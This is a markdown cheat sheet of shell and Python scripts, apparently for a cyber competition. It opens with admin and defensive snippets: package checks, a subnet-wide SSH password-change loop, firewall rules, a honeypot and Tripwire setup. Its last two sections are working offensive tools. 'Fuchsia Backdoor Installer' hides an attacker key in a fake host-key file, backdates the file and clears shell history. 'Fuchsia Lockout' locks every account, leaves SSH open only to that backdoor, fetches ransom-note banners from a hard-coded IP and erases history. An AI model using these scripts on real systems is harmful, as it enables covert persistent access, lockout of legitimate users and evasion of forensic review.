# Scripts

### Quick Commands

* RHEL verify all packages: `rpm -Va`
  * Output only if different, checks perms and hashes
* Debian verify all packages: `debsums`
  * Need to install
* Kill all PTYs that are not yours: `` kill -9 `pgrep '^(bash|sh)' | grep -v $$` ``
* Get established connections: `netstat -tpn 2>/dev/null || netstat -an | grep ESTABLISHED`
* Get listening ports: `netstat -tln 2>/dev/null || netstat -an | grep LISTEN`
* List kernel modules: `lsmod || modinfo`

### Control
* Run command on one host: `ssh <hostname> -l <username> <username> <command>`
  * Username only needed if not `root`
* Run command on all hosts: `pssh -h <hosts_file> -l <default_username> <command>`
  * Username only needed if not `root`
  * If `pssh` command doesn't exist, try `parallel-ssh`
  * `pssh` must be installed before use
* Run command on one host (ansible): `ansible <hostname> -m raw -a "<command>"`
* Run command on all hosts (ansible): `ansible all -m raw -a "<command>"`
* Run ansible playbook: `ansible-playbook name_of_playbook.yml`

### SSH Initial Spray

```
$ sudo apt install sshpass pssh
$ OP=<old_password>
$ NP=<new_password>
$ for i in {1..255}; do sshpass -p "$OP" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 <user>@10.X.X.$i "echo -e '$OP\n$NP\n$NP' | passwd" && echo 10.X.X.$i >> success & done
$ sshpass -p "$NP" parallel-ssh -h success -l <user> -t 5 -A "<sudo> /sbin/iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT && <sudo> /sbin/iptables -I INPUT 2 -j DROP"
```
Notes:
* Change `<user>` to be `root` and any admin user names provided
* Change `10.X.X` to be actual subnet
* Change `1..255` to actually represent range of IP addresses in our environment
* Change `$OP\n$NP\n$NP` to `$NP\n$NP` if <user> == root
* Need manual password change on *BSD, Solaris
* Need manual firewall on OpenSUSE (firewalld), *BSD (PfCTL), and Solaris (ipfilter)
 
###### Second round
```
$ for s in $(cat success); echo "$s:"; do read pass; sshpass -p "$NP" ssh <user>@$s "echo -e '$NP\n$pass\n$pass' | passwd & done
```

### Copy Keys

Prep: `ssh-keygen`

```
#!/usr/bin/env bash

while [ true ]
do
    echo "IP address:"
    read IP
    echo "Hostname:"
    read HOSTNAME
    ssh-copy-id root@$IP
    echo "$IP $HOSTNAME" | sudo tee -a /etc/hosts
    echo $HOSTNAME | sudo tee -a /etc/servers
    mkdir -p /servers/$HOSTNAME
done
```

### Mount SSHFS

```
#!/bin/bash

sudo mkdir -p /servers
sudo chown root:toads /servers
sudo chmod 0775 /servers

for s in $(cat /etc/servers); do
  sudo umount /servers/$s #>/dev/null 2>&1 || true
  rmdir /servers/$s #>/dev/null 2>&1 || true
  mkdir /servers/$s
  sshfs -o allow_other,ServerAliveInterval=20,reconnect root@$s:/ /servers/$s
done
```

### Convert ARP entries to static

```
$ arp -an | awk -F' ' '{print $2 $4}' | cut -d'(' -f2 | while IFS=')' read ip mac
> do arp -s $ip $mac
> done
```

### Honeypot (run command on connection)

```
#!/usr/bin/env python
import os, socket, select

ports = [12345, 12346]
socks = []

for p in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", p))
    s.listen(5)
    socks.append(s)
    
while True:
    r, w, err = select.select(socks, [], [])
    for s in r:
        c, addr = s.accept()
        c.shutdown(socket.SHUT_RDWR)
        c.close()
        os.system('wall "suspicious connection from IP: " ' + addr[0])
```

### Change SSH Setting
```
sed -i -e "/[ ]*$1/ s/^#*/#/" sshd_config
echo "$1 $2" >> sshd_config
```

Usage:
```
$ ./change_ssh PermitRootLogin no
```

### Procedurally Generate Tripwire Configuration

```
for S in `ls /servers`; do
  echo "( rulename = "$S", severity = 100)">>~/twpol.txt
  echo "{">>~/twpol.txt
  for D in `ls /servers/$S | grep -v dev | grep -v srv | grep -v proc`; do
    echo "/servers/$S/$D -> \$(ReadOnly) (recurse = true);">>~/twpol.txt
  done
  echo "}">>~/twpol.txt
done
```

### Fuchsia Backdoor Installer

```
echo "PUBKEY HERE" >> /etc/ssh/ssh_host_rsa2048_key.pub
touch -r /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa2048_key.pub
sed -i 's/\#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/ssh_host_rsa2048_key.pub/' /etc/ssh/sshd_config
sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
kill -HUP $(pgrep -f `which sshd`)
history -c
echo "" > ~/.bash_history
```


### Fuchsia Lockout

```
who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'

echo "Kicked em out!"

cp /etc/passwd /etc/passwd.backup.shad0wfuchsia
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup.shad0wfuchsia

echo "User table backed up"

echo "Locking users..."

for USERNAME in `cut -d: -f1 /etc/passwd | grep -v root`
do
  sudo passwd -l $USERNAME
done

echo "All users locked"

# Set authorized keyfile to ONLY backdoor key
sed -i 's/\AuthorizedKeysFile.*/AuthorizedKeysFile \/etc\/ssh\/ssh_host_rsa2048_key.pub/' /etc/ssh/sshd_config
sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# Disable password authentication
sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config

# Remove any existing allowusers directive, replace with root only
sed -i 's/AllowUsers.*/\#/' /etc/ssh/sshd_config
echo -e ' \n' >>/etc/ssh/sshd_config
echo 'AllowUsers root' >> /etc/ssh/sshd_config

sed -i 's/Banner.*/\#/' /etc/ssh/sshd_config
sed -i 's/#Banner.*/\#/' /etc/ssh/sshd_config
echo 'Banner /etc/fuchsia_banner' >> /etc/ssh/sshd_config

echo "SSH Configuration finished"

rm /etc/motd
wget -O /etc/fuchsia_banner http://67.205.157.179/fus-nocolor.txt
wget -O /etc/nologin http://67.205.157.179/fus.txt

echo "Ransom notes installed"

cat >~/unfuck.sh <<EOL
#!/bin/bash

wget -qO - http://67.205.157.179/paid.txt

echo "Reverting changes..."
mv /etc/passwd.backup.shad0wfuchsia /etc/passwd
mv /etc/ssh/sshd_config.backup.shad0wfuchsia /etc/ssh/sshd_config
rm /etc/nologin
echo "" >/etc/fuchsia_banner

for USERNAME in \`cut -d: -f1 /etc/passwd | grep -v root\`
do
  sudo passwd -u $USERNAME
done

echo -e "System configuration restored.\nBye!"
rm -- "\$0"
EOL

kill -HUP $(pgrep -f `which sshd`)

echo "!!!CHANGE THE ROOT PASSWORD"

history -c
echo "" > ~/.bash_history
```
